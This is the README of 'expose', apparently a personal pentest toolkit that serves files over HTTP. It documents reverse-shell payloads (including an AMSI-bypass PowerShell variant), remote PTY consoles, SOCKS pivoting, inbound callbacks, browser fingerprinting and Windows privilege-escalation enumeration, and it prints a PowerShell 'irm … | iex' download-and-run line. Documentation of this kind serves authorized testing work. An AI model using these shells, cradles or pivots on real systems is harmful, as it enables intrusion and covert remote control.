# expose

Serve text, files, or directories over HTTP from your terminal — a single-file
bash tool for quick sharing on a LAN, webhook catching, and pentest payloads.

Think `python3 -m http.server` combined with a request inspector: one command
gives you a web server with persistent request logging, file uploads (drag &
drop web UI), and built-in reverse-shell payloads.

**Version:** 2.1 · **Default port:** 9090 · **License:** personal toolkit

## Features

- **Serve anything** — a text string, a single file, stdin, or the current directory
- **Request inspection** — one-line or verbose logging (all headers, reverse DNS, parsed User-Agent)
- **Request catcher** (`--catch`) — dump full headers + body, webhook-tester style
- **Uploads** — every mode serves a drag & drop upload page; received files land in `~/Downloads/expose`
- **Operator dashboard** — responsive top navigation with session status, request/visitor totals, received-file and chat previews, and recent traffic
- **Themes** — dark + light UI; follows your OS theme automatically, manual override in the header
- **Device fingerprinting** — `/me` shows what the visitor's browser leaks: GPU, canvas fingerprint, timezone, screen, CPU/memory, storage APIs… plus a stable SHA-256 visitor id and copy-as-JSON
- **Smart request viewer** — request bodies are auto-decoded (JSON pretty-print, JWT header+payload, form-urlencoded) and credential-looking bodies are flagged with a red `creds` chip
- **CLI one-liners** — copy-ready commands per OS (Linux/macOS/Windows) for uploading files, posting to chat, and downloading shared content: curl, wget, nc, socat, python (stdlib + requests), httpie, PowerShell, certutil, bitsadmin
- **CLI consoles** — attach to the same PTY from your terminal; Ctrl+] detaches without ending the shell.
- **Browser consoles** — full interactive PTY / ConPTY sessions, Windows/macOS/Linux connection commands, terminal resizing, Ctrl+C, and disconnect controls (automatic with `expose-online`)
- **Network proxy** — `expose-online` also starts a local SOCKS5 listener; route `proxychains`, `curl`, or other tools through the connected machine's network. The listener is restricted to loopback; it needs a ticket-enrolled connector before it can relay traffic.
- **Inbound callbacks** — expose a listener on the connected machine and forward it to a local service, so targets on the endpoint's network can connect back to you.
- **Windows enumeration** — a read-only `winenum` script and command library for low-privilege host/domain checks and candidate escalation paths, with report upload.
- **Password-protected session** — `expose-online` gates the UI and API behind a login and session cookie; connector tickets and agent tokens remain self-authenticating.
- **Resilient reconnection** — the connector and tunnel retry across multi-hour outages; sessions stay attached and the console resumes when the network returns.
- **Focused operator log** — hides UI polling, deduplicates external hits, and shows login, connector, SOCKS, callback, tunnel, and real client IP events.
- **Chat attachments** — drop, paste, or attach files; image, audio, video, and safe text previews with direct downloads
- **Reverse shells** — revshells.com-style card with editable LHOST/LPORT: bash `/dev/tcp`, zsh `ztcp`, nc (`-e` + mkfifo), python3, socat for Linux/macOS; PowerShell (+ AMSI-bypass variant) and ncat for Windows; plus listener commands (nc / rlwrap / socat)
- **Persistent request log** — requests are kept in `~/.expose/requests.json` as a JSON array capped at 500 entries; internal API polling is excluded
- **Network binding** — listen on all interfaces or select a specific address
- **Response shaping** — custom status code, custom headers, CORS, artificial delay, 302 redirect mode
- **Pentest payloads** — built-in PHP / PowerShell / Python / bash reverse shells and a certutil download cradle
- **Extras** — `/me` request-echo + device-fingerprint page, JSON request log API, mini chat, new-request sound alert, and request stats view

## Requirements

| Dependency | Needed for |
|------------|------------|
| `bash`     | everything |
| `python3`  | HTTP serving, uploads, and logging; Python 3.11+ for consoles |
| `ss`, `file`, `mktemp` | standard utilities (pre-flight checks, MIME detection) |

## Install

```bash
make build      # assemble src/ into the single-file binary dist/expose
make install    # install expose and expose-online to /usr/local/bin (sudo)
make uninstall  # remove it again
make clean      # delete dist/
make run ARGS='"hello"'   # build + run in one step
```

Or run the built binary directly: `./dist/expose "hello world"`.

## Quick start

```bash
expose "hello world"                    # serve a text response
expose .                                # serve the current directory
expose -f ./notes.txt                   # serve a single file
echo "hello" | expose -                # serve stdin
expose --catch                          # webhook catcher (dumps bodies)
expose --payload powershell-reverse     # serve a reverse-shell one-liner
expose --redirect https://example.com      # 302 redirect everything
```

Stop with `Ctrl+C`. The startup banner shows the local and network URLs.

## Options

| Option | Description |
|--------|-------------|
| `-p, --port <port>` | Listen port (default: 9090) |
| `--bind <addr>` | Bind to a specific interface (default: 0.0.0.0) |
| `-m, --more` | Verbose logging: all headers, reverse DNS, parsed UA |
| `--console` | Enable local browser consoles; automatic with expose-online (Python 3.11+) |
| `--proxy [addr]` | SOCKS5 listener for routing local tools through the connected machine (default: `127.0.0.1:1080`; implies `--console`) |
| `--callback <local[:remote]>` | Listen on the connected machine and forward to `127.0.0.1:<local>` (repeatable; implies `--console`) |
| `--catch` | Request catcher — dump full headers + body (implies `--more`) |
| `--code <N>` | HTTP status code for responses (100–599, default: 200) |
| `--header "K: V"` | Add a response header (repeatable) |
| `--cors` | Add permissive CORS headers |
| `--redirect <url>` | 302 redirect all requests to the URL |
| `--payload <name>` | Serve a built-in payload (see below) |
| `--collect` | Collect requests to a JSONL log, printed on exit |
| `--delay <ms>` | Artificial response delay in milliseconds |
| `-h, --help` | Show help |
| `-V, --version` | Show the installed version without starting a server |

### Built-in payloads

`php-reverse-shell`, `powershell-reverse`, `certutil-download`,
`linux-reverse`, `python-reverse` — all contain `CHANGE_ME` placeholders for
LHOST/LPORT.

## HTTP endpoints

Every mode also exposes these built-in routes (anything else returns the served
content on `/content`, or 404):

| Route | Description |
|-------|-------------|
| `GET /` · `GET /upload` | Upload web UI (drag & drop, queue, received-files list, log panel, chat) |
| `GET /login` · `POST /login` · `POST /logout` | Password gate and session cookie |
| `POST /upload` | Multipart upload — saves to `~/Downloads/expose` |
| `POST /upload?ticket=…` | Ticket-authenticated upload for endpoint reports |
| `GET /upload/files` | JSON list of received files |
| `GET /upload/files/<name>` | Download a received file |
| `DELETE /upload/files/<name>` | Delete a received file |
| `GET /me` | Echo the client's request info + client-side device fingerprint (HTML, or JSON with `Accept: application/json`) |
| `GET /log?since=<n>` | JSON request log (last 500 entries; `since` filters by entry number) |
| `POST /log/clear` | Clear the request log |
| `GET /meta` | JSON metadata about the current mode |
| `GET /content` | The served text/file payload (not in directory mode) |
| `POST /chat/upload` | Send multipart files with an optional `message` field |
| `GET /upload/preview/<name>` | Safe inline media / text preview |
| `GET /lin`, `/mac`, `/win` | Console connector bootstrap (requires a connection ticket) |
| `POST /console/winenum/ticket` · `GET /console/winenum.ps1?ticket=…` | Windows enumeration script and its short-lived transfer ticket |
| `GET/POST /console/tools` · `GET /console/tool/<name>?ticket=…` · `GET /console/toolrunner.ps1?ticket=…` | Staged Windows tools, ticket download, and report runner |
| `/console/*` | Console status, browser control, proxy, callbacks, and connector relay |
| `GET`/`POST /chat` | Mini chat shared between visitors of the upload page |

Directory mode serves non-hidden files under `/` and a JSON listing API at
`/ls[/path]`. Hidden paths and symlinks outside the shared root are denied.

## Examples

```bash
expose --more -p 9000 -f ./notes.txt
expose --catch --code 404
expose --header "X-Custom: yes" --code 418 "I'm a teapot"
expose --bind 127.0.0.1 --catch
expose --cors --code 200 '{"ok":true}'
expose --delay 500 "slow response"
expose --collect --catch
```

## Browser consoles

Build and install the native connectors (Go 1.26+); rebuild after source updates:

```bash
make install-console-clients
expose-online
```

Open **Consoles**, choose the client OS, and copy
its connection command. Each link expires after ten minutes and accepts one
connection. Create a new link for each machine. Connectors run in the foreground
as the current user; **Disconnect** ends the remote shell. **Remove selected**
also deletes the machine from the session list and clears its terminal history,
including for sessions that have already ended. **Open terminal in new tab**
opens the selected session in a full-tab terminal that resizes with the window.
Closing that tab leaves the session connected. Full-screen programs
such as `top` and `vim`, terminal resizing, and Ctrl+C use a real PTY (Linux/macOS)
or ConPTY (Windows 10 1809+).

The copied command uses the browser's current origin, including its port. Open
the public HTTPS URL before copying a command for an off-LAN machine. Remote and LAN connections require verified HTTPS. Plain HTTP is accepted
only on loopback for local testing. Traffic returns through the same HTTP(S) server/tunnel,
with no separate listener port. A proxy must allow the `/console/*`, `/lin`,
`/mac`, and `/win` routes and requests that wait up to ten seconds.

Connectors for x64 and ARM64 Windows, macOS, and Linux are stored in
`~/.local/share/expose/clients` (override with `EXPOSE_CLIENT_DIR`). Downloads are
SHA-256 checked before execution. The web UI is password protected when
`EXPOSE_AUTH_PASSWORD` is set (see below); connector enrollment uses expiring
single-use tickets and per-session bearer tokens. Console credentials and
traffic are excluded from the request inspector. Remote connections require
verified HTTPS. Direct `expose` can share chat and files publicly; console control
always requires an owner capability or an authenticated operator session.
`expose-online` requires authentication for shared files and chat as well.

## Network proxy

`expose-online` starts a SOCKS5 listener on `127.0.0.1:1080` alongside the
console. Each connection is dialled by the connected machine, so local tools can
reach hosts and services that only that machine can see. This is forward
proxying — the machine opens outbound connections; it does not receive a shell.

```bash
expose proxychains curl https://example.com
curl --socks5-hostname 127.0.0.1:1080 https://example.com
```

The proxy uses the newest connected machine. Select another in **Consoles →
Network proxy → Use selected machine**. Override the listener with
`PROXY_PORT=1080` or `PROXY_BIND=127.0.0.1:1080`; set `PROXY_BIND=off` to
disable it. `expose --proxy [addr]` enables the same listener in a local
session and implies `--console`.

`GET /console/proxy` reports active streams and counters (`opens`, `failed`,
`sent`, `received`). Each stream moves data in HTTP chunks, so bulk transfers
are limited by round-trip time; it is intended for control traffic and scans,
not large file copies.

Proxy traffic is capped at 256 concurrent streams, 4 MB per stream buffer, and
512 KB of queued outbound data per machine. Disconnecting the console closes its
streams.

## Inbound callbacks

A callback creates a listener on the connected machine and forwards every
accepted connection to a service on the expose host. Use it when a target on the
endpoint's network must connect back to you and your machine is not reachable
from that network.

```bash
expose-online --callback 4444          # endpoint:4444 → 127.0.0.1:4444
expose-online --callback 4444:9000     # endpoint:9000 → 127.0.0.1:4444
```

Or add one under **Consoles → Inbound callbacks**. The endpoint binds
`0.0.0.0:<remote>` for the life of the console session; the UI and startup
output show its address. Remove the callback to close the listener.

```bash
# terminal 1
expose-online --callback 4444

# terminal 2 — local listener
nc -lvnp 4444

# target on the endpoint network
# connect to <endpoint-ip>:4444
```

Anyone who can reach `<endpoint-ip>:<remote>` can use the forward, so choose a
port deliberately. Callbacks are rebound when a console reconnects. The local
service must be listening before the target connects.

Ports below 1024 require root or `CAP_NET_BIND_SERVICE` on Linux/macOS. On
Windows, port 445 is owned by the SMB service (`System`) and cannot be bound by
the connector while SMB is running. Use a high remote port when you control the
client, for example `--callback 445:8445` (endpoint:8445 → local:445).

## Windows enumeration

**Consoles → Windows enumeration** provides a copy/run library of read-only
checks and a `winenum` script for a selected Windows console. It runs as the
current user; nothing is installed and no configuration is changed.

```powershell
# what the Run winenum button sends
$ExposeTicket='…'; $ExposeOrigin='https://singlecore.dev'
irm "$ExposeOrigin/console/winenum.ps1?ticket=$ExposeTicket" | iex
```

The script collects:

- Identity, groups, integrity level, and dangerous token privileges
- Host, domain, patch level, Defender/EDR status, processes, and sessions
- Network configuration, listeners, routes, SMB mappings, proxy settings
- Local and domain users/groups, domain controllers, trusts, GPO summary
- Services, unquoted paths, writeable service files/directories, raw service ACLs
- Scheduled tasks, autoruns, startup folders, installed software, shares
- Presence of credential material (paths only): `cmdkey`, `klist`, DPAPI files,
  SSH keys, PowerShell history, unattend/sysprep files
- Escalation indicators: `AlwaysInstallElevated`, autologon password presence,
  writeable `PATH` directories, UAC settings, AppLocker policy
- A final **Candidate escalation paths** summary

The report is written to `%TEMP%\expose-winenum-<host>-<time>.txt` and uploaded
through a short-lived ticket to `~/Downloads/expose` on this host. The script
ticket is issued only to an authenticated operator session; the ticket only
grants the script download and report upload, and expires after one hour.

### Windows tools

Third-party tools are **not bundled**. Upload the official files under
**Consoles → Windows tools**; expose stores them in
`~/.local/share/expose/tools` (override `EXPOSE_TOOLS_DIR`) and serves them to
the endpoint through the same short-lived ticket.

| Tool | Accepted filename | Report |
|------|-------------------|--------|
| winPEAS | `winPEAS*.exe` or `.bat` | text transcript |
| Seatbelt | `Seatbelt.exe` | text transcript |
| PrivescCheck | `PrivescCheck.ps1` | text transcript |
| SharpHound | `SharpHound.exe` | ZIP for BloodHound |

The UI warns that these tools can trigger Defender/EDR detection, quarantine,
or alerts. The tool runner downloads the file to `%TEMP%`, runs it as the
current user, captures output, and uploads the report/ZIP to
`~/Downloads/expose` through the ticket. No service or persistence is created.

This is **read-only path identification**, not exploitation. It does not dump
credentials or modify services, tasks, or ACLs. Validate candidates manually.
For domain attack paths use **BloodHound/SharpHound**, **Certipy** (AD CS), and
**Grouper2/GPOHound**; for network context use **NetExec**. Public tools are
heavily signatured by Defender/EDR, so use this only on authorized systems.

## Password protection

`expose-online` requires an operator-configured password before serving the UI
or API. Override it with `EXPOSE_AUTH_PASSWORD`; an empty value is rejected.
Direct `expose` uses the same variable for optional file-sharing authentication;
console control is always authenticated independently.

- `GET /login` serves the login page; a correct password sets an HttpOnly,
  SameSite=Strict session cookie valid for 12 hours. `Secure` is added when the
  tunnel forwards HTTPS.
- Wrong passwords are rate-limited per client address.
- Connector enrollment routes (`/lin`, `/mac`, `/win`, `/console/client/*`,
  `/console/register`, `/console/agent/*`) and the health probe
  `/.expose-health` are exempt because they require single-use tickets or
  per-session bearer tokens.
- Everything else — uploads, chat, files, console control, proxy, and
  callbacks — requires the session.
- The password is never written to the request log. **Log out** is in the
  header.

There is no default password. Store `EXPOSE_AUTH_PASSWORD` in
`~/.config/expose/online.env` (owned by you, mode `0600`), or provide it through
the environment. The file is shell configuration and must stay outside Git.
An explicit environment password takes precedence. An empty password is rejected.

## Reconnection and outages

Both sides retry for long outages instead of exiting.

- The connector retries relay requests with exponential backoff (1 s → 60 s)
  indefinitely. The PTY/ConPTY and shell stay alive; a `2–3 hour` network gap
  resumes without a new connection command.
- Sessions are retained server-side for 24 hours. The UI shows **away** after
  45 seconds without traffic and returns to **Connected** when requests resume.
- `expose-online` retries the SSH tunnel forever with backoff (3 s → 60 s) and
  prints `Tunnel down (attempt N)` / `Tunnel restored`. It does not exit when
  the public path is unavailable.
- Connector registration is retry-safe: the connector sends a nonce and the
  server returns the same session if the registration response was lost. The
  invitation itself still expires after ten minutes.
- If the endpoint reboots or the connector process is killed, the in-memory
  session is gone and a fresh connection command is required.

`expose-online` settings:

| Variable | Default | Purpose |
|----------|---------|---------|
| `TUNNEL_HOST` / `TUNNEL_PORT` / `TUNNEL_USER` | `213.118.201.119` / `47865` / `root` | SSH jump host |
| `TUNNEL_RPORT` / `TUNNEL_LPORT` | `9090` / `9090` | Remote/local forward ports |
| `TUNNEL_RBIND` | `127.0.0.1` | Reverse bind address on the jump host |
| `PROXY_PORT` / `PROXY_BIND` | `1080` / `127.0.0.1:1080` | SOCKS5 listener |
| `EXPOSE_AUTH_PASSWORD` | none | Required UI/API password for `expose-online`; empty is rejected |

The reverse port is bound to `127.0.0.1` on the jump host by default
(`TUNNEL_RBIND`), so nginx is the only public entry point. SSH runs in batch
mode with password prompts disabled; use a key or agent.

## Operator output

The console is event-focused, not a request firehose:

- Internal polling (`/log`, `/chat`, `/upload/files`, `/meta`, `/console/*`,
  health) is hidden.
- External HTTP hits are deduplicated on `(IP, method, path, status)` for 60
  seconds.
- Login events, connector join/resume/leave, SOCKS connections, callback
  starts, and tunnel state are printed with timestamps and the real client IP.
- The JSON request log still records external traffic for the Traffic view and
  includes `ip` (real) and `peer` (local tunnel address).

Real IPs come from `X-Real-IP`, then the last `X-Forwarded-For` entry, only when
the direct peer is loopback (the SSH tunnel). A direct LAN client cannot spoof
them.

## Jump host (nginx)

The SSH tunnel binds `127.0.0.1:9090` on the jump host. Publish it through
nginx:

```nginx
location / {
    proxy_pass http://127.0.0.1:9090;
    proxy_http_version 1.1;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $remote_addr;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_read_timeout 30s;
    proxy_buffering off;
    client_max_body_size 64m;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}
```

`X-Forwarded-For` and `X-Forwarded-Proto` are required for real-IP logging and
for the `Secure` session cookie. Overwrite `X-Forwarded-For` (as above) so a
client cannot spoof its address. If nginx is behind Cloudflare or another
proxy, configure `ngx_http_realip_module` so `$remote_addr` is the real client.
If the tunnel binds a different address, set `TUNNEL_RBIND`.

## CLI operator shell

Start the server normally in one terminal. Use another terminal to manage it:

```bash
expose-online
# In a second terminal:
expose sessions
expose attach                  # automatically selects the only connected shell
expose attach 2                # numbered session, full ID, or unique ID prefix
expose proxychains curl https://example.com
```

**Ctrl+] detaches the local CLI without closing the remote shell or proxy.**
Ctrl+C interrupts the remote command. `exit` or Ctrl+D ends the remote shell.
Working directory, environment, processes, and PTY remain on the connector when
the operator detaches. Browser and CLI attach to the same shell; input from
either controls it. Proxy routing keeps the server’s current selected endpoint. Avoid typing into both at once. Resize and UTF-8 input are
forwarded, and retry identifiers prevent duplicate command input after a lost
HTTP acknowledgement. A temporary network failure does not close the connector.

`expose-online sessions`, `attach`, `invite`, `login`, `logout`, and `proxychains`
are aliases for the corresponding `expose` commands. They do not start or replace
an HTTP server or SSH tunnel. Running servers from older builds need one planned
restart before they can support the CLI protocol; active sessions cannot migrate
across a server restart.

Enroll a new endpoint from the CLI with `expose invite linux`, `expose invite mac`,
or `expose invite win`. Copy the printed short-lived command only to a machine
you are authorized to control. It is a credential: do not paste it into Git or
public logs. Invitations expire after ten minutes and registration consumes them.
The online wrapper selects its HTTPS public origin; `--origin https://YOUR-HOST`
overrides it. Connector binaries are checked against the bootstrap's SHA-256 hash.
On another laptop, log in to the existing public origin and attach there. Start
one online relay per public hostname/remote port; use the CLI from your other
machines to share that instance.

For remote operator access:

```bash
expose login --url https://YOUR-HOST    # asks for the operator password
expose sessions                       # remembers the selected origin
expose attach
expose logout                         # revokes this saved login, keeps shells alive
```

Local access uses a fresh per-instance key under `~/.expose/instances/` (directory
`0700`, files `0600`); it is never accepted on forwarded HTTP requests. Remote
access requires verified HTTPS and the same password/session login as the web UI.
Cookies are saved privately under `~/.expose/operator/` and expire server-side.
There is no TLS-verification bypass. Connector bearer tokens, enrollment tickets,
and operator credentials have separate scopes. Console control remains protected
even when ordinary file sharing has no password. Browser console control requires
`EXPOSE_AUTH_PASSWORD`; a local CLI can use its instance key directly.

The online wrapper's HTTP listener and the SOCKS listener bind to loopback.
SOCKS intentionally has no additional local password; it cannot be bound to a
public interface. SSH keys protect the jump-host reverse tunnel, HTTPS protects
public operator/enrollment traffic, and tickets authenticate connectors. If you
need SOCKS from another machine, use an authenticated SSH local forward.
Private proxychains configuration is selected automatically by `expose proxychains`.

## Isolated Docker playground

```bash
./playground.sh test             # build and run the complete clean-container suite
./playground.sh up               # keep a disposable shell ready for manual use
./playground.sh sessions
./playground.sh attach           # Ctrl+] detaches
./playground.sh proxychains curl http://127.0.0.1:8000
./playground.sh down             # destroy only this playground
```

The amd64 playground runs as UID 1000, drops all capabilities, uses a read-only
root filesystem and bounded tmpfs storage, and has no network interface except
loopback. It publishes no ports and mounts no host files or Docker socket. Build
dependencies require internet access; runtime tests are offline. Its server,
connector, credentials, and tests exist only inside the disposable container.
Repeated `up` preserves the running playground. Use `down`, rebuild, and `up` to
test a new image when its current sessions can end.
The built-in target on port 8000 returns `PLAYGROUND_PROXY_OK` through the real
connector and SOCKS relay. Hidden files and symlinks outside a shared directory
are not served, so directory sharing cannot expose private instance keys.

## Development

The binary is generated — edit `src/` and rebuild with `make build`; never edit
`dist/expose` directly. Run `make test` for the integration suite. See
[AGENTS.md](AGENTS.md) for the architecture, build system, and contribution
conventions.

Building the optional console connector clients requires Go 1.26 or later.
